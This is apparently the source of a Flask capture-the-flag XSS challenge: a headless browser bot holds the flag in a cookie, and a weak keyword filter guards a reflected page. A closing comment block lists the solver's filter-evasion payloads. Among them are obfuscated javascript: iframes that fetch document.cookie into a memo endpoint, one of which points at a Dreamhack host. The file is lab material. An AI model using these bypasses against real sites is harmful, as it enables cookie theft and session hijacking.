#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"

    return text

@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    param = xss_filter(param)
    return param


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)

'''
<iframe src="jA	V	a	sCr	iPT:Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURI('fetch%28%22%2Fmemo%3Fmemo%3D%22%20%2B%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();" />
<iframe src="jA	V	a	sCr	iPT:Boolean[decodeURI%28'%63%6F%6E%73%74%72%75%63%74%6F%72'%29]%28decodeURI%28'fetch%28%22http%3A%2F%2Fhost3.dreamhack.games%3A20255%2Fmemo%3Fmemo%3D%22%20%2B%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'%29%29%28%29;" />
<iframe src="data:base64;, YWxlcnQoMSk=" />

<ScripT></ScRipt>

fetch%28%22http%3A%2F%2Fhost3.dreamhack.games%3A20255%2Fmemo%3Fmemo%3D%22%20%2B%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29
%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65

<iframe src="jA	V	a	sCr	iPT:alert`1` />

%3Cscript%3Ealert(document.cookie)%3C/script%3E
<script>alert(1)</script>
%3C%53cript%3Ealert`1`%3C%2F%53cript%3E
'''